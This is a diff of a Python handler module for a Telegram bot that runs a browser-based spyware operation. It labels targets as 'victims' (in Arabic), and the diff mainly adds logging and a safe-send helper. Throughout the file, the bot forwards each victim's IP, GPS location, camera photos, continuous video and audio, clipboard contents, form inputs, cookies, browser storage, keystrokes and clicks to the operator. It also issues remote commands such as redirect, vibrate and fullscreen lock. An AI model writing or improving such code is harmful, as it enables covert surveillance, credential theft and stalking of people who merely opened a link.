@@ -1,6 +1,6 @@
 # lsh/handlers.py
 # ============================================================
-# معالجة الرسائل v6
+# معالجة الرسائل v6 — مع Logging شامل
 # ============================================================
 
 import io
@@ -30,7 +30,48 @@ def set_bot_reference(bot):
     """ربط البوت"""
     global _BOT_REF
     _BOT_REF = bot
-    logger.info("Bot reference set for LSH handlers")
+    logger.info("✅ Bot reference set for LSH handlers")
+
+
+# ============================================================
+# ★★★ دالة مساعدة لإرسال رسائل آمنة ★★★
+# ============================================================
+def _safe_send(bot, chat_id, text, **kwargs):
+    """يرسل رسالة بشكل آمن مع logging"""
+    if not bot:
+        logger.error(f"❌ No bot instance for chat_id={chat_id}")
+        return False
+
+    if not chat_id:
+        logger.error(f"❌ Empty chat_id")
+        return False
+
+    try:
+        # نظّف chat_id
+        chat_id_str = str(chat_id).strip()
+
+        # حوّل لـ int لو ممكن
+        cid = int(chat_id_str) if chat_id_str.isdigit() else chat_id_str
+
+        logger.info(f"📤 Sending to chat_id={cid} | text={text[:80]}")
+
+        result = bot.send_message(cid, text, **kwargs)
+        logger.info(f"✅ Sent to {cid} successfully")
+        return True
+
+    except Exception as e:
+        error_msg = str(e)
+
+        if "Forbidden" in error_msg or "blocked" in error_msg:
+            logger.error(f"❌ FORBIDDEN: User {chat_id} hasn't started the bot or blocked it")
+        elif "chat not found" in error_msg.lower():
+            logger.error(f"❌ CHAT NOT FOUND: {chat_id}")
+        elif "bad request" in error_msg.lower():
+            logger.error(f"❌ BAD REQUEST for {chat_id}: {error_msg}")
+        else:
+            logger.exception(f"❌ send_message error: {e}")
+
+        return False
 
 
 # ============================================================
@@ -38,7 +79,17 @@ def set_bot_reference(bot):
 # ============================================================
 def _handle_incoming(bot, chat_id, session_id, data, source_ip):
     dtype = data.get('type')
-    logger.debug(f"[<<] {dtype} | {session_id[:8]}")
+
+    logger.info(f"🔔 [HANDLE] dtype={dtype} | session={session_id[:8] if session_id else 'None'} | chat_id={chat_id} (type={type(chat_id).__name__})")
+
+    if not _BOT_REF:
+        logger.error("❌ _BOT_REF is None! Bot not set. Call set_bot_reference() first.")
+        return
+
+    # ★ تأكد من chat_id
+    if not chat_id:
+        logger.error(f"❌ chat_id is empty in _handle_incoming")
+        return
 
     try:
         # ═══════════════════════════════════════════════════
@@ -65,11 +116,12 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             return
 
         # ═══════════════════════════════════════════════════
-        # Events
+        # Events — الأحداث اللي بتروح للمستخدم
         # ═══════════════════════════════════════════════════
         if dtype == 'landing':
-            bot.send_message(
-                chat_id,
+            logger.info(f"🎯 LANDING event — sending to {chat_id}")
+            _safe_send(
+                _BOT_REF, chat_id,
                 f"🎯 <b>الضحية فتح الرابط!</b>\n"
                 f"🆔 <code>{session_id}</code>\n"
                 f"🌐 IP: <code>{source_ip}</code>\n\n"
@@ -78,31 +130,31 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             )
 
         elif dtype == 'retry_click':
-            bot.send_message(
-                chat_id,
+            _safe_send(
+                _BOT_REF, chat_id,
                 f"👆 <b>الضحية ضغط على إعادة المحاولة!</b>\n🆔 <code>{session_id}</code>",
                 parse_mode="HTML"
             )
 
         elif dtype == 'page_visible':
             update_session(session_id, page_status="visible")
-            bot.send_message(
-                chat_id,
+            _safe_send(
+                _BOT_REF, chat_id,
                 f"👁️ <b>الضحية فتح الصفحة!</b>\n🆔 <code>{session_id}</code>",
                 parse_mode="HTML"
             )
 
         elif dtype == 'page_unload':
-            bot.send_message(
-                chat_id,
+            _safe_send(
+                _BOT_REF, chat_id,
                 f"🚪 <b>الضحية يحاول إغلاق الصفحة!</b>\n🆔 <code>{session_id}</code>",
                 parse_mode="HTML"
             )
 
         elif dtype == 'manual_reconnect':
             update_session(session_id, reconnect_count=0)
-            bot.send_message(
-                chat_id,
+            _safe_send(
+                _BOT_REF, chat_id,
                 f"🔄 <b>إعادة اتصال يدوية</b> — <code>{session_id[:8]}</code>",
                 parse_mode="HTML"
             )
@@ -117,8 +169,9 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             from .panel import build_lsh_control_panel
             update_session(session_id, stability="ready", page_status="visible")
             panel = build_lsh_control_panel(session_id, chat_id)
-            bot.send_message(
-                chat_id,
+
+            _safe_send(
+                _BOT_REF, chat_id,
                 f"✅ <b>الجلسة <code>{session_id[:8]}</code> جاهزة للتحكم الكامل</b>\n"
                 f"استخدم اللوحة أدناه 👇",
                 parse_mode="HTML",
@@ -133,8 +186,9 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             info['ip'] = source_ip
             update_session(session_id, info=info)
             text = _format_info_report(info, session_id)
-            bot.send_message(
-                chat_id, text,
+            _safe_send(
+                _BOT_REF, chat_id,
+                text,
                 parse_mode="HTML",
                 disable_web_page_preview=True
             )
@@ -143,8 +197,8 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             loc = data.get('location') or {}
             if loc and loc.get('latitude'):
                 lat, lng = loc['latitude'], loc['longitude']
-                bot.send_message(
-                    chat_id,
+                _safe_send(
+                    _BOT_REF, chat_id,
                     f"📍 <b>الموقع:</b> <code>{lat}, {lng}</code>\n"
                     f'<a href="https://maps.google.com/?q={lat},{lng}">🗺️ خرائط</a>',
                     parse_mode="HTML"
@@ -154,8 +208,8 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             loc = data.get('location') or {}
             if loc and loc.get('latitude'):
                 lat, lng = loc['latitude'], loc['longitude']
-                bot.send_message(
-                    chat_id,
+                _safe_send(
+                    _BOT_REF, chat_id,
                     f"📍 <b>تحديث موقع:</b> <code>{lat}, {lng}</code>",
                     parse_mode="HTML"
                 )
@@ -164,19 +218,19 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
         # Media
         # ═══════════════════════════════════════════════════
         elif dtype == 'first_photo':
-            _send_photo(bot, chat_id, data.get('image', ''), "📸 <b>صورة أولية</b>")
+            _send_photo(_BOT_REF, chat_id, data.get('image', ''), "📸 <b>صورة أولية</b>")
 
         elif dtype == 'first_audio':
-            _send_audio(bot, chat_id, data.get('audio', ''), "🎙️ <b>تسجيل صوتي أولي</b>")
+            _send_audio(_BOT_REF, chat_id, data.get('audio', ''), "🎙️ <b>تسجيل صوتي أولي</b>")
 
         elif dtype == 'periodic_photo':
-            _send_photo(bot, chat_id, data.get('image', ''), "📸 <b>صورة دورية</b>")
+            _send_photo(_BOT_REF, chat_id, data.get('image', ''), "📸 <b>صورة دورية</b>")
 
         elif dtype == 'continuous_video_chunk':
-            _send_video(bot, chat_id, data.get('data', ''), "📹 <b>فيديو مستمر</b>")
+            _send_video(_BOT_REF, chat_id, data.get('data', ''), "📹 <b>فيديو مستمر</b>")
 
         elif dtype == 'always_audio_chunk':
-            _send_audio(bot, chat_id, data.get('data', ''), "🎤 <b>مقطع صوتي دائم</b>")
+            _send_audio(_BOT_REF, chat_id, data.get('data', ''), "🎤 <b>مقطع صوتي دائم</b>")
 
         # ═══════════════════════════════════════════════════
         # Command Results
@@ -191,11 +245,11 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             if status == 'ok':
                 if cmd_id:
                     ack_command(session_id, cmd_id)
-                _handle_cmd_success(bot, chat_id, action, result)
+                _handle_cmd_success(_BOT_REF, chat_id, action, result)
             else:
                 if cmd_id:
                     nack_command(session_id, cmd_id, error[:100])
-                _handle_cmd_failure(bot, chat_id, action, error)
+                _handle_cmd_failure(_BOT_REF, chat_id, action, error)
 
         # ═══════════════════════════════════════════════════
         # Monitors
@@ -211,8 +265,8 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
         elif dtype == 'clipboard_copy':
             c = data.get('content', '')
             if c:
-                bot.send_message(
-                    chat_id,
+                _safe_send(
+                    _BOT_REF, chat_id,
                     f"📋 <b>نسخ:</b>\n<pre>{c[:300]}</pre>",
                     parse_mode="HTML"
                 )
@@ -220,8 +274,8 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
         elif dtype == 'clipboard_paste':
             c = data.get('content', '')
             if c:
-                bot.send_message(
-                    chat_id,
+                _safe_send(
+                    _BOT_REF, chat_id,
                     f"📥 <b>لصق:</b>\n<pre>{c[:300]}</pre>",
                     parse_mode="HTML"
                 )
@@ -234,15 +288,18 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             ]
             for k, v in list(form_data.items())[:20]:
                 lines.append(f"• <code>{k}</code>: <code>{str(v)[:100]}</code>")
-            bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")
+            _safe_send(_BOT_REF, chat_id, "\n".join(lines), parse_mode="HTML")
 
         elif dtype == 'click':
             txt = (data.get('text') or '').strip()
             if txt and len(txt) > 2:
                 _accumulate_click(chat_id, session_id, txt)
 
+        else:
+            logger.warning(f"⚠️ Unknown dtype: {dtype}")
+
     except Exception as e:
-        logger.exception(f"_handle_incoming error ({dtype}): {e}")
+        logger.exception(f"❌ _handle_incoming error ({dtype}): {e}")
 
 
 # ============================================================
@@ -258,21 +315,18 @@ def _handle_cmd_success(bot, chat_id, action, data):
             _send_video(bot, chat_id, data, "🎥 <b>فيديو</b> ✅")
         elif action == 'screen':
             _send_photo(bot, chat_id, data, "🖥️ <b>لقطة شاشة</b> ✅")
-
         elif action == 'clipboard':
-            bot.send_message(
-                chat_id,
+            _safe_send(
+                bot, chat_id,
                 f"📋 <b>الحافظة:</b>\n<pre>{str(data)[:1000]}</pre>",
                 parse_mode="HTML"
             )
-
         elif action == 'cookies':
-            bot.send_message(
-                chat_id,
+            _safe_send(
+                bot, chat_id,
                 f"🍪 <b>الكوكيز:</b>\n<pre>{str(data)[:1500]}</pre>",
                 parse_mode="HTML"
             )
-
         elif action == 'storage':
             try:
                 storage_data = json.loads(data)
@@ -282,58 +336,39 @@ def _handle_cmd_success(bot, chat_id, action, data):
                 msg += f"📦 <b>IndexedDB:</b> {len(storage_data.get('indexedDB_names', []))}\n"
                 msg += f"📦 <b>Caches:</b> {len(storage_data.get('cache_keys', []))}\n\n"
                 msg += f"<pre>{json.dumps(storage_data, ensure_ascii=False, indent=2)[:2500]}</pre>"
-                bot.send_message(chat_id, msg, parse_mode="HTML")
-            except json.JSONDecodeError:
-                bot.send_message(
-                    chat_id,
-                    f"💾 <b>التخزين:</b>\n<pre>{str(data)[:1500]}</pre>",
-                    parse_mode="HTML"
-                )
-
+                _safe_send(bot, chat_id, msg, parse_mode="HTML")
+            except Exception:
+                _safe_send(bot, chat_id, f"💾 <b>التخزين:</b>\n<pre>{str(data)[:1500]}</pre>", parse_mode="HTML")
         elif action == 'location':
             try:
                 loc = json.loads(data)
                 lat, lng = loc.get('latitude'), loc.get('longitude')
-                bot.send_message(
-                    chat_id,
+                _safe_send(
+                    bot, chat_id,
                     f"📍 <b>الموقع:</b> <code>{lat}, {lng}</code>\n"
                     f'<a href="https://maps.google.com/?q={lat},{lng}">خرائط</a>',
                     parse_mode="HTML"
                 )
-            except json.JSONDecodeError:
-                bot.send_message(chat_id, f"📍 {data}")
-
+            except Exception:
+                _safe_send(bot, chat_id, f"📍 {data}")
         elif action == 'url':
-            bot.send_message(
-                chat_id,
-                f"✅ <b>تم فتح الرابط</b>\n<code>{data}</code>",
-                parse_mode="HTML"
-            )
-
+            _safe_send(bot, chat_id, f"✅ <b>تم فتح الرابط</b>\n<code>{data}</code>", parse_mode="HTML")
         elif action == 'vibrate':
-            bot.send_message(chat_id, "📳 <b>تم الاهتزاز</b> ✅")
-
+            _safe_send(bot, chat_id, "📳 <b>تم الاهتزاز</b> ✅")
         elif action == 'redirect':
-            bot.send_message(chat_id, "✅ <b>تم إنهاء الجلسة</b>")
-
+            _safe_send(bot, chat_id, "✅ <b>تم إنهاء الجلسة</b>")
         elif action == 'continuous_video':
-            bot.send_message(chat_id, "📹 <b>بدأ التسجيل المستمر</b>")
-
+            _safe_send(bot, chat_id, "📹 <b>بدأ التسجيل المستمر</b>")
         elif action == 'always_audio':
-            bot.send_message(chat_id, "🎤 <b>بدأ التسجيل الصوتي</b>")
-
+            _safe_send(bot, chat_id, "🎤 <b>بدأ التسجيل الصوتي</b>")
         elif action == 'stop_recording':
-            bot.send_message(chat_id, "⏹️ <b>تم إيقاف التسجيل</b>")
-
+            _safe_send(bot, chat_id, "⏹️ <b>تم إيقاف التسجيل</b>")
         elif action == 'toast':
-            bot.send_message(chat_id, "💬 <b>تم عرض الرسالة</b>")
-
+            _safe_send(bot, chat_id, "💬 <b>تم عرض الرسالة</b>")
         elif action == 'play_sound':
-            bot.send_message(chat_id, "🔊 <b>تم تشغيل الصوت</b>")
-
+            _safe_send(bot, chat_id, "🔊 <b>تم تشغيل الصوت</b>")
         elif action == 'fullscreen':
-            bot.send_message(chat_id, "🔒 <b>تم تفعيل القفل</b>")
-
+            _safe_send(bot, chat_id, "🔒 <b>تم تفعيل القفل</b>")
         elif action == 'status':
             try:
                 sd = json.loads(data)
@@ -344,20 +379,14 @@ def _handle_cmd_success(bot, chat_id, action, data):
                 msg += f"📷 كاميرا: {'✅' if sd.get('camera') else '❌'}\n"
                 msg += f"🎤 ميكروفون: {'✅' if sd.get('mic') else '❌'}\n"
                 msg += f"👁️ الصفحة: <code>{sd.get('visibility', 'unknown')}</code>\n"
-                msg += f"📹 فيديو: {'✅' if sd.get('recording_video') else '❌'}\n"
-                msg += f"🎙️ صوت: {'✅' if sd.get('recording_audio') else '❌'}\n"
-                msg += f"🔄 محاولات: <code>{sd.get('reconnect_attempts', 0)}</code>\n"
                 msg += f"📡 القناة: <code>{sd.get('channel', 'unknown')}</code>\n"
-                bot.send_message(chat_id, msg, parse_mode="HTML")
-            except json.JSONDecodeError:
-                bot.send_message(chat_id, f"🕵️ {data}")
-
+                _safe_send(bot, chat_id, msg, parse_mode="HTML")
+            except Exception:
+                _safe_send(bot, chat_id, f"🕵️ {data}")
         elif action == 'reconnect':
-            bot.send_message(chat_id, "🔄 <b>تم إعادة الاتصال</b>")
-
+            _safe_send(bot, chat_id, "🔄 <b>تم إعادة الاتصال</b>")
         else:
-            bot.send_message(chat_id, f"✅ <code>{action}</code> تم")
-
+            _safe_send(bot, chat_id, f"✅ <code>{action}</code> تم")
     except Exception as e:
         logger.exception(f"_handle_cmd_success error: {e}")
 
@@ -384,11 +413,7 @@ def _handle_cmd_failure(bot, chat_id, action, error):
     msg = msgs.get(key)
     if not msg:
         msg = f"❌ <b>{action} فشل:</b> <code>{error[:100]}</code>"
-
-    try:
-        bot.send_message(chat_id, msg, parse_mode="HTML")
-    except Exception as e:
-        logger.warning(f"_handle_cmd_failure send error: {e}")
+    _safe_send(bot, chat_id, msg, parse_mode="HTML")
 
 
 # ============================================================
@@ -397,13 +422,19 @@ def _handle_cmd_failure(bot, chat_id, action, error):
 def _send_photo(bot, chat_id, data_url, caption):
     try:
         if not data_url or not data_url.startswith('data:image'):
+            logger.warning(f"_send_photo: Invalid data URL")
             return
         _, encoded = data_url.split(',', 1)
         buf = io.BytesIO(base64.b64decode(encoded))
         buf.name = 'capture.jpg'
-        bot.send_photo(chat_id, buf, caption=caption, parse_mode="HTML")
+
+        cid = int(str(chat_id).strip()) if str(chat_id).strip().isdigit() else chat_id
+
+        logger.info(f"📤 Sending photo to {cid}")
+        bot.send_photo(cid, buf, caption=caption, parse_mode="HTML")
+        logger.info(f"✅ Photo sent to {cid}")
     except Exception as e:
-        logger.warning(f"_send_photo error: {e}")
+        logger.exception(f"_send_photo error: {e}")
 
 
 def _send_audio(bot, chat_id, data_url, caption):
@@ -413,9 +444,14 @@ def _send_audio(bot, chat_id, data_url, caption):
         _, encoded = data_url.split(',', 1)
         buf = io.BytesIO(base64.b64decode(encoded))
         buf.name = 'capture.webm'
-        bot.send_audio(chat_id, buf, caption=caption, parse_mode="HTML")
+
+        cid = int(str(chat_id).strip()) if str(chat_id).strip().isdigit() else chat_id
+
+        logger.info(f"📤 Sending audio to {cid}")
+        bot.send_audio(cid, buf, caption=caption, parse_mode="HTML")
+        logger.info(f"✅ Audio sent to {cid}")
     except Exception as e:
-        logger.warning(f"_send_audio error: {e}")
+        logger.exception(f"_send_audio error: {e}")
 
 
 def _send_video(bot, chat_id, data_url, caption):
@@ -425,9 +461,14 @@ def _send_video(bot, chat_id, data_url, caption):
         _, encoded = data_url.split(',', 1)
         buf = io.BytesIO(base64.b64decode(encoded))
         buf.name = 'capture.webm'
-        bot.send_video(chat_id, buf, caption=caption, parse_mode="HTML")
+
+        cid = int(str(chat_id).strip()) if str(chat_id).strip().isdigit() else chat_id
+
+        logger.info(f"📤 Sending video to {cid}")
+        bot.send_video(cid, buf, caption=caption, parse_mode="HTML")
+        logger.info(f"✅ Video sent to {cid}")
     except Exception as e:
-        logger.warning(f"_send_video error: {e}")
+        logger.exception(f"_send_video error: {e}")
 
 
 # ============================================================
@@ -446,14 +487,11 @@ def _accumulate_key(chat_id, session_id, key):
 
     if now - buf["last"] > 4 or len(buf["text"]) > 180:
         if buf["text"].strip() and _BOT_REF:
-            try:
-                _BOT_REF.send_message(
-                    chat_id,
-                    f"⌨️ <b>لوحة المفاتيح:</b>\n<pre>{buf['text'][:500]}</pre>",
-                    parse_mode="HTML"
-                )
-            except Exception as e:
-                logger.debug(f"key buffer send error: {e}")
+            _safe_send(
+                _BOT_REF, chat_id,
+                f"⌨️ <b>لوحة المفاتيح:</b>\n<pre>{buf['text'][:500]}</pre>",
+                parse_mode="HTML"
+            )
         buf["text"] = ""
         buf["last"] = now
 
@@ -465,15 +503,12 @@ def _accumulate_click(chat_id, session_id, text):
 
     if now - buf["last"] > 6 or len(buf["texts"]) >= 8:
         if _BOT_REF and buf["texts"]:
-            try:
-                unique = list(dict.fromkeys(buf["texts"]))[:8]
-                _BOT_REF.send_message(
-                    chat_id,
-                    "🖱️ <b>النقرات:</b>\n" + "\n".join(f"• {t[:70]}" for t in unique),
-                    parse_mode="HTML"
-                )
-            except Exception as e:
-                logger.debug(f"click buffer send error: {e}")
+            unique = list(dict.fromkeys(buf["texts"]))[:8]
+            _safe_send(
+                _BOT_REF, chat_id,
+                "🖱️ <b>النقرات:</b>\n" + "\n".join(f"• {t[:70]}" for t in unique),
+                parse_mode="HTML"
+            )
         buf["texts"] = []
         buf["last"] = now
 
